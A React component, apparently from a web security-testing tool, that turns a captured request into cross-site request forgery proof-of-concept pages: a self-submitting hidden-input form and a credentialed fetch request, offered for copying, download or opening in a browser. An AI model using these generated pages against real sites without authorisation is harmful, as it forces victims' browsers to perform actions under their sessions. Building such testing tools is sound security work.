import { useState } from "react";

export default function CsrfPoc({ url, method, payloads, buildRequest, inputStyle, panelStyle }) {
  const [pocType, setPocType] = useState("html");
  const [show, setShow] = useState(false);
  const [copied, setCopied] = useState(false);

  function generateHtmlPoc() {
    const payload = payloads[0] ?? "";
    const { targetUrl, body } = buildRequest(payload);
    const params = body ? body.split("&").map(p => {
      const [k, v] = p.split("=");
      return `  <input type="hidden" name="${decodeURIComponent(k || "")}" value="${decodeURIComponent(v || "")}" />`;
    }).join("\n") : "";

    return `<!DOCTYPE html>
<html>
<head><title>CSRF POC</title></head>
<body>
  <form id="csrfForm" action="${targetUrl}" method="${method === "GET" ? "GET" : "POST"}">
${params}
    <input type="submit" value="Submit" />
  </form>
  <script>document.getElementById("csrfForm").submit();<\/script>
</body>
</html>`;
  }

  function generateJsPoc() {
    const payload = payloads[0] ?? "";
    const { targetUrl, body, parsedHeaders } = buildRequest(payload);
    const headersObj = { ...parsedHeaders };
    delete headersObj["Cookie"];

    return `<!DOCTYPE html>
<html>
<head><title>CSRF POC</title></head>
<body>
  <script>
    fetch("${targetUrl}", {
      method: "${method}",
      credentials: "include",
      headers: ${JSON.stringify(headersObj, null, 6)},
      ${method !== "GET" ? `body: "${body.replaceAll('"', '\\"')}"` : ""}
    })
    .then(r => r.text())
    .then(t => {
      document.body.innerHTML = "<pre>" + t + "<\/pre>";
    })
    .catch(e => console.error(e));
  <\/script>
</body>
</html>`;
  }

  const poc = pocType === "html" ? generateHtmlPoc() : generateJsPoc();

  function copyPoc() {
    navigator.clipboard.writeText(poc);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }

  function openPoc() {
    const blob = new Blob([poc], { type: "text/html" });
    const blobUrl = URL.createObjectURL(blob);
    window.open(blobUrl, "_blank");
  }

  function downloadPoc() {
    const blob = new Blob([poc], { type: "text/html" });
    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = `csrf-poc-${pocType}.html`;
    a.click();
  }

  return (
    <div style={{ ...panelStyle, marginTop: 0 }}>

      {/* Header row */}
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
        <span style={{ fontSize: 9, color: "#52525b", letterSpacing: 2 }}>CSRF POC</span>
        <button
          onClick={() => setShow(s => !s)}
          style={{
            padding: "5px 12px", borderRadius: 8, border: "none",
            background: show ? "#fb923c" : "rgba(255,255,255,0.06)",
            color: show ? "#000" : "#71717a",
            fontFamily: "inherit", fontSize: 11, cursor: "pointer", fontWeight: 700
          }}
        >
          {show ? "Hide" : "Generate ▾"}
        </button>
      </div>

      {show && (
        <>
          {/* Type toggle */}
          <div style={{ display: "flex", borderRadius: 8, overflow: "hidden", border: "1px solid #27272a" }}>
            {["html", "js"].map(t => (
              <button key={t} onClick={() => setPocType(t)} style={{
                flex: 1, padding: "7px", border: "none", fontFamily: "inherit",
                fontSize: 11, cursor: "pointer",
                background: pocType === t ? "#fb923c" : "rgba(255,255,255,0.04)",
                color: pocType === t ? "#000" : "#71717a",
                fontWeight: pocType === t ? 700 : 400,
              }}>
                {t === "html" ? "📄 HTML Form" : "⚡ JS Fetch"}
              </button>
            ))}
          </div>

          {/* Description */}
          <div style={{ fontSize: 10, color: "#52525b", lineHeight: 1.5 }}>
            {pocType === "html"
              ? "Auto-submitting HTML form. Works without JS enabled. Best for simple POST/GET CSRF."
              : "Fetch-based POC. Sends with credentials included. Best for JSON or custom headers."}
          </div>

          {/* POC preview */}
          <pre style={{
            background: "#000", borderRadius: 10, padding: 12,
            fontSize: 10, color: "#d4d4d8", whiteSpace: "pre-wrap",
            wordBreak: "break-all", maxHeight: 200, overflowY: "auto", margin: 0
          }}>
            {poc}
          </pre>

          {/* Action buttons */}
          <div style={{ display: "flex", gap: 6 }}>
            <button onClick={copyPoc} style={actionBtn}>
              {copied ? "✅ Copied" : "📋 Copy"}
            </button>
            <button onClick={downloadPoc} style={actionBtn}>
              💾 Download
            </button>
            <button onClick={openPoc} style={{ ...actionBtn, background: "rgba(251,146,60,0.15)", color: "#fb923c", border: "1px solid rgba(251,146,60,0.3)" }}>
              🚀 Test in Browser
            </button>
          </div>
        </>
      )}
    </div>
  );
}

const actionBtn = {
  flex: 1, padding: "7px", borderRadius: 8,
  background: "rgba(255,255,255,0.06)",
  border: "1px solid rgba(255,255,255,0.08)",
  color: "#a1a1aa", fontFamily: "inherit",
  fontSize: 11, cursor: "pointer",
};
